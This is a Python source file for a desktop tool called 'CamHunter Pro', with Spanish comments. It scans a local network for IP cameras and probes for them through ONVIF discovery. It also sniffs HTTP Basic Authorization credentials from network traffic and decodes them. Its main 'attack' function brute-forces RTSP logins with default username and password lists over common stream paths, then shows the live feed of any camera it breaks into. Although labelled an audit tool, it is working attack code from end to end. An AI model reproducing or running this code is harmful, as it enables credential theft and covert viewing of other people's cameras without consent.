import customtkinter as ctk
import nmap
import scapy.all as scapy
from scapy.layers.inet import IP
import socket
import threading
import cv2
import requests
import base64
import re
import os
import psutil
from datetime import datetime

# --- CONFIGURACIÓN DE DICCIONARIOS ---
USERS = ["admin", "root", "support", "user", "admin123", "888888", "666666", "operator", "supervisor", "guest", "service"]
PASSWORDS = ["admin", "12345", "123456", "password", "root", "1234", "admin123", "888888", "tlslnk", "12345678", "9999", "pass", ""]

RTSP_PATHS = [
    "", "/live", "/h264", "/Streaming/Channels/101", "/Streaming/Channels/102",
    "/cam/realmonitor?channel=1&subtype=0", "/videoMain", "/live/ch0", "/stream1", "/stream2",
    "/onvif-media/video", "/media/video1", "/axis-media/media.amp", "/mjpeg/video.cgi"
]

class CamHunterMaster(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("CamHunter Pro v7.0 | Cybersecurity Command Center")
        self.geometry("1250x850")
        ctk.set_appearance_mode("Dark")
        
        self.nm = nmap.PortScanner()
        self.sniffing = False
        self.findings = []
        self.interfaces = self.get_net_interfaces()

        # --- GRID LAYOUT ---
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Panel Lateral
        self.sidebar = ctk.CTkFrame(self, width=300, corner_radius=0)
        self.sidebar.grid(row=0, column=0, rowspan=2, sticky="nsew")
        
        ctk.CTkLabel(self.sidebar, text="NETWORK AUDIT", font=("Impact", 28)).pack(pady=20)
        
        # --- SELECTOR DE INTERFAZ Y RED ---
        ctk.CTkLabel(self.sidebar, text="1. Seleccionar Interfaz:", anchor="w").pack(fill="x", padx=20)
        self.iface_menu = ctk.CTkOptionMenu(self.sidebar, values=list(self.interfaces.keys()), command=self.update_network_range)
        self.iface_menu.pack(pady=10, padx=20)

        ctk.CTkLabel(self.sidebar, text="2. Rango de Red (Editable):", anchor="w").pack(fill="x", padx=20)
        self.net_entry = ctk.CTkEntry(self.sidebar, placeholder_text="ej. 192.168.1.0/24")
        self.net_entry.pack(pady=10, padx=20)
        
        # Botones de Acción
        self.btn_scan = ctk.CTkButton(self.sidebar, text="🌐 Escanear Dispositivos", command=self.start_network_scan)
        self.btn_scan.pack(pady=10, padx=20)

        self.btn_onvif = ctk.CTkButton(self.sidebar, text="🔍 ONVIF Discovery", fg_color="#d35400", command=self.run_onvif_discovery)
        self.btn_onvif.pack(pady=10, padx=20)

        self.btn_sniff = ctk.CTkButton(self.sidebar, text="📡 Sniffer de Passwords", fg_color="#27ae60", command=self.toggle_sniffer)
        self.btn_sniff.pack(pady=10, padx=20)

        self.btn_report = ctk.CTkButton(self.sidebar, text="📄 Generar Reporte Final", fg_color="#2980b9", command=self.generate_report)
        self.btn_report.pack(pady=40, padx=20)

        # Consola Central
        self.log_box = ctk.CTkTextbox(self, font=("Consolas", 12), fg_color="#000", text_color="#00ff41")
        self.log_box.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")

        # Barra de Ataque Inferior
        self.action_bar = ctk.CTkFrame(self, height=80)
        self.action_bar.grid(row=1, column=1, sticky="ew", padx=10, pady=10)
        
        self.ip_entry = ctk.CTkEntry(self.action_bar, placeholder_text="IP Objetivo (Click en scan para autocompletar)", width=350)
        self.ip_entry.pack(side="left", padx=20)
        
        self.btn_brute = ctk.CTkButton(self.action_bar, text="🚀 ATACAR Y VER EN VIVO", fg_color="#e74c3c", font=("Arial", 14, "bold"), command=self.launch_attack)
        self.btn_brute.pack(side="left", padx=10)

        # Inicializar red por defecto
        self.update_network_range(self.iface_menu.get())

    # --- LÓGICA DE RED ---
    def get_net_interfaces(self):
        """Obtiene todas las interfaces con IPv4"""
        ifaces = {}
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    # Guardamos IP y Máscara para calcular el CIDR
                    ifaces[f"{interface} ({addr.address})"] = {
                        "ip": addr.address,
                        "mask": addr.netmask
                    }
        return ifaces

    def update_network_range(self, choice):
        """Calcula automáticamente el rango de red al cambiar de interfaz"""
        data = self.interfaces[choice]
        ip = data['ip']
        mask = data['mask']
        try:
            # Convertir máscara a CIDR (ej. 255.255.255.0 -> 24)
            cidr = sum(bin(int(x)).count('1') for x in mask.split('.'))
            network = f"{ip.rsplit('.', 1)[0]}.0/{cidr}"
            self.net_entry.delete(0, "end")
            self.net_entry.insert(0, network)
            self.log(f"[*] Interfaz cambiada. Nueva red objetivo: {network}")
        except:
            self.net_entry.delete(0, "end")
            self.net_entry.insert(0, "192.168.1.0/24")

    def log(self, msg):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_box.insert("end", f"[{timestamp}] {msg}\n")
        self.log_box.see("end")
        self.findings.append(f"[{timestamp}] {msg}")

    # --- FUNCIONES DE AUDITORÍA ---
    def start_network_scan(self):
        target_net = self.net_entry.get()
        self.log(f"[*] Escaneando red: {target_net} ...")
        threading.Thread(target=self._scan_thread, args=(target_net,), daemon=True).start()

    def _scan_thread(self, network):
        try:
            # Escaneo de puertos comunes y detección de servicios
            self.nm.scan(hosts=network, arguments='-p 80,554,8000,37777 --open -T4')
            for host in self.nm.all_hosts():
                ports = list(self.nm[host]['tcp'].keys())
                self.log(f"[+] DISPOSITIVO: {host} | Puertos Abiertos: {ports}")
                # Si tiene el puerto RTSP, lo sugerimos para ataque inmediato
                if 554 in ports:
                    self.ip_entry.delete(0, "end")
                    self.ip_entry.insert(0, host)
                    self.log(f"    --> Sugerencia: {host} parece ser una cámara.")
        except Exception as e:
            self.log(f"[!] Error en escaneo: {e}")

    def run_onvif_discovery(self):
        self.log("[*] Lanzando Sonda Multicast ONVIF...")
        threading.Thread(target=self._onvif_thread, daemon=True).start()

    def _onvif_thread(self):
        msg = '<?xml version="1.0" encoding="utf-8"?><Envelope xmlns:tds="http://www.onvif.org/ver10/device/wsdl" xmlns="http://www.w3.org/2003/05/soap-envelope"><Header><MessageID xmlns="http://schemas.xmlsoap.org/ws/2004/08/addressing">uuid:84ede405-7798-4660-8480-1a13e8784d85</MessageID><To xmlns="http://schemas.xmlsoap.org/ws/2004/08/addressing">urn:schemas-xmlsoap-org:ws:2004:08:discovery</To><Action xmlns="http://schemas.xmlsoap.org/ws/2004/08/addressing">http://schemas.xmlsoap.org/ws/2004/08/discovery/Probe</Action></Header><Body><Probe xmlns="http://schemas.xmlsoap.org/ws/2004/08/discovery"><Types>tds:Device</Types></Probe></Body></Envelope>'
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(5)
        try:
            sock.sendto(msg.encode(), ('239.255.255.250', 3702))
            while True:
                data, addr = sock.recvfrom(65535)
                self.log(f"[!] RESPUESTA ONVIF: {addr[0]}")
                self.ip_entry.delete(0, "end")
                self.ip_entry.insert(0, addr[0])
        except socket.timeout:
            self.log("[*] ONVIF: Búsqueda completada.")

    def toggle_sniffer(self):
        if not self.sniffing:
            self.sniffing = True
            self.btn_sniff.configure(text="🛑 PARAR SNIFFER", fg_color="#c0392b")
            self.log("[*] Sniffer iniciado. Capturando credenciales en tránsito...")
            threading.Thread(target=self._sniffer_thread, daemon=True).start()
        else:
            self.sniffing = False
            self.btn_sniff.configure(text="📡 INICIAR SNIFFER", fg_color="#27ae60")

    def _sniffer_thread(self):
        # Escuchamos en la interfaz seleccionada (opcional, Scapy suele detectar la principal)
        scapy.sniff(prn=self._process_packet, filter="tcp port 80 or tcp port 554", stop_filter=lambda x: not self.sniffing)

    def _process_packet(self, pkt):
        if pkt.haslayer(scapy.Raw):
            load = str(pkt[scapy.Raw].load)
            if "Authorization: Basic" in load:
                auth = re.search(r"Basic\s([A-Za-z0-9+/=]+)", load)
                if auth:
                    creds = base64.b64decode(auth.group(1)).decode('utf-8')
                    self.log(f"🔥 [!] CREDENCIALES CAPTURADAS: {creds} (IP: {pkt[IP].src})")

    def launch_attack(self):
        target = self.ip_entry.get()
        if target:
            threading.Thread(target=self._brute_force, args=(target,), daemon=True).start()

    def _brute_force(self, ip):
        self.log(f"[*] Iniciando ataque contra {ip}...")
        for u in USERS:
            for p in PASSWORDS:
                for path in RTSP_PATHS:
                    auth = f"{u}:{p}@" if (u or p) else ""
                    url = f"rtsp://{auth}{ip}:554{path}"
                    cap = cv2.VideoCapture(url)
                    cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 1000)
                    if cap.isOpened():
                        self.log(f"✅ ACCESO CONCEDIDO: {url}")
                        self.show_video(cap, url)
                        return
                    cap.release()
        self.log("[X] No se pudo encontrar acceso. Revisa el Sniffer.")

    def show_video(self, cap, url):
        window_name = f"AUDITORIA VIVA - {url}"
        cv2.namedWindow(window_name, cv2.WINDOW_NORMAL)
        cv2.resizeWindow(window_name, 800, 600)
        while True:
            ret, frame = cap.read()
            if not ret: break
            cv2.putText(frame, "CAMHUNTER: AUDITORIA EN CURSO", (20, 40), cv2.FONT_HERSHEY_DUPLEX, 0.7, (0, 255, 0), 1)
            cv2.imshow(window_name, frame)
            if (cv2.waitKey(1) & 0xFF == ord('q')) or (cv2.getWindowProperty(window_name, cv2.WND_PROP_VISIBLE) < 1):
                break
        cap.release()
        try:
            cv2.destroyWindow(window_name)
        except cv2.error:
            pass

    def generate_report(self):
        name = f"Audit_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(name, "w", encoding="utf-8") as f:
            f.write("=== CAMHUNTER SECURITY AUDIT REPORT ===\n")
            f.write(f"Target Network: {self.net_entry.get()}\n")
            f.write(f"Interface: {self.iface_menu.get()}\n")
            f.write("-" * 40 + "\n\n")
            for entry in self.findings:
                f.write(entry + "\n")
        self.log(f"--- REPORTE GUARDADO: {name} ---")
        os.startfile(name)

if __name__ == "__main__":
    app = CamHunterMaster()
    app.mainloop()
